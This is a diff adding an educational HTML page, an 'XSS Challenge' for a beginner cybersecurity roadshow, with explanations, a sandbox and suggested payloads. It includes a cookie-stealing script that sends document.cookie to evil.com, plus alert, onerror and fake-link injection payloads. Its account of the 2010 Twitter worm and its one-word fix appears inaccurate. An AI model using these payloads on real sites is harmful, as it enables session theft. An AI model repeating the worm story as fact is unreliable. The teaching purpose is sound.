@@ -1,0 +1,170 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>XSS Challenge: Message Mischief | Cyber Roadshow</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <script>if(localStorage.getItem("theme")==="light")document.documentElement.classList.add("light-mode");</script>
+  <link rel="stylesheet" href="styles.css" />
+</head>
+<body data-jcode="XSS has hit some BIG names — Twitter, YouTube, and even the British government's website have been hit by XSS attacks. The fix is always the same: NEVER trust user input. Sanitize everything! 🛡️ Type the script tag and see what happens.">
+  <div class="binary-bg" aria-hidden="true"></div>
+
+  <!-- Navigation -->
+  <nav class="top-nav">
+    <div class="top-nav-inner">
+      <a href="index.html" style="text-decoration: none;">
+        <div class="brand">
+          <div class="brand-icon">CY</div>
+          <div class="brand-text">
+            <span class="brand-title">Cyber Roadshow</span>
+            <span class="brand-subtitle">Explore. Protect. Level Up.</span>
+          </div>
+        </div>
+      </a>
+      <ul class="nav-links">
+        <li><a href="computer_literacy.html" class="nav-link"><span>Internet Safety</span></a></li>
+        <li><a href="activities.html" class="nav-link"><span>Activities</span></a></li>
+        <li><a href="cybersecurity.html" class="nav-link"><span>About Cyber</span></a></li>
+        <li><a href="about_beattie.html" class="nav-link"><span>About Beattie</span></a></li>
+        <li><a href="careers.html" class="nav-link"><span>Careers</span></a></li>
+        <li><a href="sectors.html" class="nav-link"><span>Public vs Private</span></a></li>
+      </ul>
+    </div>
+  </nav>
+
+  <div class="page-shell">
+    <main>
+      <section class="section">
+        <div class="section-header">
+          <div class="section-eyebrow">Activity 5: Digital Graffiti</div>
+          <h2 class="section-title">XSS Challenge: Message Mischief!</h2>
+          <p class="section-subtitle">
+            Ever wonder if someone could mess with a website's messages? This challenge shows you how! XSS (Cross-Site Scripting) is like sneaking a hidden message onto a bulletin board that everyone sees, even if it's not supposed to be there. Type some special code into the box and see if you can make something unexpected happen! (Don't worry, you're just playing with a pretend website here, so it's safe to experiment!)
+          </p>
+        </div>
+
+        <div class="eli5-box">
+          <button class="eli5-toggle" aria-expanded="false">
+            🧒 ELI5 — What is XSS (Cross-Site Scripting)?
+            <em class="eli5-arrow">▼</em>
+          </button>
+          <div class="eli5-body">
+            <p>Imagine a school bulletin board where anyone can post a note. What if someone posted a note that said: <em>“If you read this, you have to give me your lunch money!”</em> — that’s kind of what XSS is, but for websites.</p>
+            <p><strong>XSS</strong> happens when a hacker hides a script (a tiny computer program) inside a message or comment on a website. When other users visit that page, the script runs in their browser silently — potentially stealing their login cookies, passwords, or personal data.</p>
+            <p><strong>How websites stop it:</strong> Good websites <em>sanitize</em> (clean up) all user input before showing it to others — stripping out any script tags or dangerous code. If you type <code>&lt;script&gt;</code> and nothing happens, that’s the sanitizer doing its job!</p>
+          </div>
+        </div>
+
+        <!-- What XSS actually does -->
+        <section class="section">
+          <div class="section-header">
+            <div class="section-eyebrow">What's Actually at Risk</div>
+            <h2 class="section-title">What an XSS Attack Can Really Do</h2>
+            <p class="section-subtitle">An alert pop-up is just the demo. In the real world, attackers use XSS to do much more damage silently.</p>
+          </div>
+          <div class="cards-grid cards-grid--top">
+            <article class="card">
+              <h3>🍪 Cookie Theft</h3>
+              <p>Your login session is stored in something called a <strong>cookie</strong>. If an attacker injects this into a page you visit:</p>
+              <div class="code-block"><span class="inject">&lt;script&gt;</span>
+  new Image().src =
+    "https://evil.com/steal?c="
+    + document.cookie;
+<span class="inject">&lt;/script&gt;</span></div>
+              <p style="margin-top:8px;">Your cookies — including your login session — get sent to the attacker's server. They can now log in as <em>you</em>, without ever knowing your password.</p>
+            </article>
+
+            <article class="card">
+              <h3>📋 Stored vs. Reflected XSS</h3>
+              <p><strong style="color:var(--danger)">Stored XSS</strong> — The malicious script is saved into the site's database (e.g. in a comment or username). Every user who loads the page runs the attack automatically. This is the most dangerous type.</p>
+              <p style="margin-top:10px;"><strong style="color:var(--accent-yellow)">Reflected XSS</strong> — The attack travels in a link. The victim clicks a crafted URL, and the script bounces off the server back to their browser. Common in phishing emails.</p>
+              <p style="margin-top:10px;">Both types run in your browser as if the <em>website itself</em> sent the code — so your browser trusts it completely.</p>
+            </article>
+
+            <article class="card">
+              <h3>🛡️ The Fix: Never Use innerHTML</h3>
+              <p>The #1 cause of XSS is using <code style="color:var(--danger);background:rgba(255,75,129,0.1);padding:2px 5px;border-radius:4px;">innerHTML</code> to display user input. It executes any script tags inside it.</p>
+              <div class="code-block"><span class="comment">// ❌ Vulnerable — runs any script</span>
+<span class="inject">div.innerHTML = userInput;</span>
+
+<span class="comment">// ✅ Safe — treats input as plain text</span>
+<span class="safe">div.textContent = userInput;</span></div>
+              <p style="margin-top:8px;">Using <code style="color:var(--accent-green)">textContent</code> instead of <code style="color:var(--danger)">innerHTML</code> is one of the most important habits a web developer can have.</p>
+            </article>
+          </div>
+        </section>
+
+        <!-- Payloads to try -->
+        <section class="section">
+          <div class="section-header">
+            <div class="section-eyebrow">Try These in the Lab</div>
+            <h2 class="section-title">XSS Payloads to Experiment With</h2>
+            <p class="section-subtitle">Copy any of these into the input box below. Some will trigger alerts, some won't — try to figure out why.</p>
+          </div>
+          <div class="cards-grid cards-grid--top">
+            <article class="card">
+              <h3>🧪 Test Payloads</h3>
+              <ul class="payload-list">
+                <li>
+                  <code>&lt;script&gt;alert('XSS!')&lt;/script&gt;</code>
+                  <span class="payload-note">The classic. If the site uses innerHTML, this pops an alert.</span>
+                </li>
+                <li>
+                  <code>&lt;img src=x onerror=alert('XSS via image!')&gt;</code>
+                  <span class="payload-note">No script tag needed — the broken image triggers JavaScript via the onerror event. Bypasses basic filters.</span>
+                </li>
+                <li>
+                  <code>&lt;b&gt;I made this text bold!&lt;/b&gt;</code>
+                  <span class="payload-note">Even without JavaScript, HTML injection lets attackers change how a page looks — a stepping stone to social engineering.</span>
+                </li>
+                <li>
+                  <code>&lt;a href="https://evil.com"&gt;Click here to win!&lt;/a&gt;</code>
+                  <span class="payload-note">Injects a fake link into the page. Visitors could be redirected to phishing sites.</span>
+                </li>
+              </ul>
+            </article>
+            <article class="card">
+              <h3>💣 Real World: Twitter Worm 2010</h3>
+              <p>In 2010, a teenager named Masato Kinugawa discovered an XSS flaw in Twitter. He wrote a worm that — when a user just <em>hovered their mouse</em> over a tweet — automatically retweeted the payload to all their followers.</p>
+              <p style="margin-top:10px;">The worm spread to over <strong>600,000 accounts in minutes</strong> before Twitter could patch it. No click was required. Just a mouse hover.</p>
+              <p style="margin-top:10px;">Twitter's fix? Replace <code style="color:var(--danger)">innerHTML</code> with <code style="color:var(--accent-green)">textContent</code> in the tweet rendering code. One word change stopped the whole thing.</p>
+              <p style="margin-top:10px;color:var(--accent-green);font-weight:700;">innerHTML → textContent. That's it. That's the fix.</p>
+            </article>
+          </div>
+        </section>
+
+        <!-- The interactive lab -->
+        <section class="section">
+          <div class="section-header">
+            <div class="section-eyebrow">Your Turn</div>
+            <h2 class="section-title">Try Injecting a Script</h2>
+          </div>
+          <div class="cards-grid">
+            <article class="card">
+              <h3>💬 Cross-Site Scripting Sandbox</h3>
+              <label for="xss-input" class="label">Your Message (try a payload from above!)</label>
+              <input id="xss-input" type="text" class="input" placeholder="&lt;script&gt;alert('XSS');&lt;/script&gt;" />
+              <button id="xss-display-btn" class="button">Display Message</button>
+              <div id="xss-output" class="result"></div>
+            </article>
+          </div>
+        </section>
+
+        <div class="hero-actions" style="margin-top: 30px;">
+          <a href="sql_injection.html" class="btn-ghost">Previous Activity</a>
+          <a href="encryption.html" class="btn-primary" id="next-activity-btn">Next Activity: Simple Encryption</a>
+        </div>
+      </section>
+    </main>
+  </div>
+
+  <footer class="page-footer">
+    Cybersecurity protects people, not just computers. Keep exploring, stay
+    curious, and use your skills to help others stay safe online.
+  </footer>
+
+  <script src="common.js"></script>
+  <script src="xss_challenge.js"></script>
+</body>
+</html>
